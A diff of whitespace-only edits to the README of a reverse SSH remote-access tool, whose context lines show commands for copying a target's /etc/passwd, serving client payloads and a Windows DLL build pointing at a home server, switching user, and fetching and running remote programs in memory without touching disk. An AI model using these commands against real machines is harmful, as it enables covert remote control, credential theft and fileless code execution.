@@ -148,7 +148,6 @@ ssh -D 9050 -J your.rssh.server.internal:3232 dummy.machine
 
 # SCP
 scp -J your.rssh.server.internal:3232 dummy.machine:/etc/passwd .
-
 ```
 
 ## Sponsors 
@@ -239,7 +238,6 @@ This requires the web server component has been enabled.
 # Generate a client and serve it on a named link
 catcher$ link --name test
 http://your.rssh.server.internal:3232/test
-
 ```
 
 Then you can download it as follows:
@@ -331,7 +329,6 @@ http://your.rssh.server.internal:3232/windows_dll
 
 # If building manually
 CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
-
 ```
 
 ### SSH Subsystems
@@ -340,11 +337,15 @@ The SSH protocol supports calling subsystems with the `-s` flag. In RSSH this is
 
 
 #### All
+
 `list`  Lists avaiable subsystem
+
 `sftp`: Runs the sftp handler to transfer files
 
 #### Linux
+
 `setgid`:   Attempt to change group
+
 `setuid`:   Attempt to change user
 
 #### Windows
@@ -431,6 +432,7 @@ ssh -J your.rssh.server:3232 <rssh_client_id> https://your.host/program
 `http/https`: Pure web downloading
 
 `rssh`: Download via the rssh server
+
 The rssh server will serve content from the `downloads` directory in the executables working directory.
 
 Both of these methods will opportunistically use [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html) which will not write any executables to disk.
